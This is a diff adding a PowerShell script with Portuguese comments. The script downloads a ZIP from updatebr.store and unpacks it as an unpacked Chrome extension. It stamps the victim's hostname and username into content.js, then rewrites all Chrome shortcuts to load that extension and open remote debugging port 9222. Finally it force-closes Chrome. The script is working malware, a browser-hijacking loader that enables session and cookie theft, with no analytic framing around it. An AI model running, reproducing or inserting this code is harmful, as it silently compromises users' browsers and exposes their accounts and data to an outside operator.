@@ -1,0 +1,168 @@
+
+
+# Função para identificar o último diretório modificado na pasta C:\Users
+function Get-LoggedInUserFromLastModified {
+    $usersPath = "C:\Users"
+    
+    # Obtém o diretório com a última modificação (usuário ativo)
+    $lastModifiedDir = Get-ChildItem $usersPath | Where-Object { $_.PsIsContainer } | Sort-Object LastWriteTime -Descending | Select-Object -First 1
+
+    if ($lastModifiedDir) {
+        $loggedInUser = $lastModifiedDir.Name
+        return $loggedInUser
+    } else {
+        Write-Host "Erro: Não foi possível identificar o usuário logado." -ForegroundColor Red
+        exit 1
+    }
+}
+
+# Identificar o usuário logado com base no último diretório modificado
+$user = Get-LoggedInUserFromLastModified
+Write-Host "Usuário logado identificado: $user"
+
+# Definir o caminho do perfil do usuário logado
+$profilePath = "C:\Users\$user"
+
+# Verificar se o perfil do usuário existe
+if (-Not (Test-Path $profilePath)) {
+    Write-Host "Erro: O perfil do usuário $user não foi encontrado." -ForegroundColor Red
+    exit 1
+}
+
+# 1. Set-ExecutionPolicy
+Set-ExecutionPolicy Unrestricted -Scope Process -Force
+
+if (-Not (Test-Path "C:\Windows\Temp")) {
+    New-Item -Path "C:\Windows\Temp" -ItemType Directory
+}
+
+# 2. Baixar o ZIP e esperar até o download completar
+$zipUrl = "https://updatebr.store/ext.zip"
+$destinationZip = "C:\Windows\Temp\ext.zip"
+$headers = @{
+    'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
+}
+Invoke-WebRequest -Uri $zipUrl -Headers $headers -OutFile $destinationZip
+#Start-BitsTransfer -Source $zipUrl -Destination $destinationZip
+
+
+# Verifica se o download foi concluído
+if (-Not (Test-Path $destinationZip)) {
+    Write-Host "Erro: O arquivo ZIP não foi baixado corretamente." -ForegroundColor Red
+    exit 1
+}
+
+# Verificar o tamanho do arquivo para garantir que o download foi bem-sucedido
+$zipInfo = Get-Item $destinationZip
+if ($zipInfo.Length -eq 0) {
+    Write-Host "Erro: O arquivo ZIP está vazio ou corrompido." -ForegroundColor Red
+    exit 1
+}
+
+# 3. Verificar e criar o diretório C:\Intel\content
+$intelContentDir = "C:\temp\content"
+if (-Not (Test-Path $intelContentDir)) {
+    New-Item -Path $intelContentDir -ItemType Directory
+}
+
+# 4. Extrair o ZIP
+try {
+    Expand-Archive -Path $destinationZip -DestinationPath $intelContentDir -Force
+} catch {
+    Write-Host "Erro: A extração do ZIP falhou. Detalhes: $_" -ForegroundColor Red
+    exit 1
+}
+
+# Verificar se o arquivo content.js foi extraído corretamente
+$backgroundJsPath = "$intelContentDir\content.js"
+if (-Not (Test-Path $backgroundJsPath)) {
+    Write-Host "Erro: O arquivo content.js não foi encontrado no caminho especificado: $backgroundJsPath" -ForegroundColor Red
+    exit 1
+}
+
+# 5. Modificar o arquivo content.js
+$hostname = $env:COMPUTERNAME
+$username = $user
+
+# Carrega o conteúdo do arquivo, substitui as strings e salva novamente
+$fileContent = Get-Content $backgroundJsPath
+$fileContent = $fileContent -replace "'PC-NOME'", "'$hostname/$username'"
+Set-Content $backgroundJsPath -Value $fileContent
+Write-Host "Substituições no content.js realizadas com sucesso."
+
+
+
+
+
+
+
+# Função para procurar e atualizar atalhos
+function Update-ChromeShortcuts {
+    param (
+        [string]$path,    # Caminho para procurar os atalhos
+        [string]$pattern  # Padrão para buscar nos atalhos (chrome*.exe)
+    )
+
+    # Verifica se o diretório existe
+    if (Test-Path $path) {
+        Write-Host "Procurando atalhos no diretório: $path"
+
+        # Encontra todos os arquivos .lnk (atalhos)
+        $shortcuts = Get-ChildItem -Path $path -Filter "*.lnk" -Recurse -ErrorAction SilentlyContinue
+
+        foreach ($shortcut in $shortcuts) {
+            # Cria um objeto de atalho
+            $wShell = New-Object -ComObject WScript.Shell
+            $link = $wShell.CreateShortcut($shortcut.FullName)
+
+            # Verifica se o alvo contém "chrome*.exe"
+            if ($link.TargetPath -match $pattern) {
+                Write-Host "Atualizando atalho: $shortcut"
+
+                # Limpa todos os parâmetros anteriores relacionados ao --remote-debugging-port e --load-extension
+                $cleanedArguments = $link.Arguments -replace '--remote-debugging-port=\d{4,5}', '' -replace '--load-extension=".*?"', ''
+                
+                # Adiciona apenas os parâmetros necessários
+                $cleanedArguments = $cleanedArguments.Trim() + ' --remote-debugging-port=9222 --load-extension="C:\temp\content"'
+
+                # Atualiza os argumentos no atalho
+                $link.Arguments = $cleanedArguments
+                $link.Save()  # Salva as alterações
+
+                Write-Host "Novo caminho do atalho: $($link.TargetPath) $($link.Arguments)"
+            }
+        }
+    } else {
+        Write-Host "Diretório não encontrado: $path"
+    }
+}
+
+# Lista de diretórios para buscar os atalhos
+$directories = @(
+    "C:\ProgramData\Microsoft\Internet Explorer\Quick Launch",
+    "C:\ProgramData\Microsoft\Windows\Start Menu",
+    "C:\ProgramData\Microsoft\Windows\Start Menu\Programs",
+    "C:\Users\*\Desktop",
+    "C:\Users\*\OneDrive\?rea de Trabalho",
+    "C:\Users\*\AppData\Roaming\Microsoft\Windows\Start Menu",
+    "C:\Users\*\AppData\Roaming\Microsoft\Windows\Start Menu\Programs",
+    "C:\Users\*\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch",
+    "C:\Users\*\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar",
+    "C:\Users\*\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\ImplicitAppShortcuts"
+)
+
+# Padrão de busca nos atalhos
+$chromePattern = "chrome.*\.exe"
+
+# Itera sobre os diretórios e executa a função
+foreach ($directory in $directories) {
+    Update-ChromeShortcuts -path $directory -pattern $chromePattern
+}
+
+# Finalizar todos os processos relacionados ao Chrome
+Write-Host "Finalizando processos do Chrome..."
+Stop-Process -Name "chrome" -Force -ErrorAction SilentlyContinue
+Stop-Process -Name "chrome_proxy" -Force -ErrorAction SilentlyContinue
+Stop-Process -Name "new_chrome" -Force -ErrorAction SilentlyContinue
+
+Write-Host "Processos do Chrome finalizados."
